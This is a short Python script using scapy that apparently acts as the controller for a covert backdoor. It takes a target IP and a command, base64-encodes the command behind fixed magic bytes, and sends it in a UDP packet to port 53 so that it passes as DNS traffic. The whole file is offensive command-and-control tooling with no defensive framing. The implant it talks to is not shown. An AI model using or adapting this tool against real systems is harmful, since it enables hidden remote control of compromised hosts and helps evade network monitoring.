from scapy.all import IP, UDP, Raw, send
import base64

MAGIC_WORD = b"\x90\x90\xfa\xce"

def main():
    print("=== Magic Packet Command Sender ===")
    target_ip = input("[*] RHOST IP: ").strip()
    command = input("[*] Command to Send: ").strip()

    encoded_cmd = base64.b64encode(command.encode())
    payload = MAGIC_WORD + encoded_cmd

    packet = IP(dst=target_ip) / UDP(dport=53) / Raw(load=payload)

    print(f"[+] Sending to {target_ip} : {command}")
    send(packet)
    print("[+] Complite!")

if __name__ == "__main__":
    main()
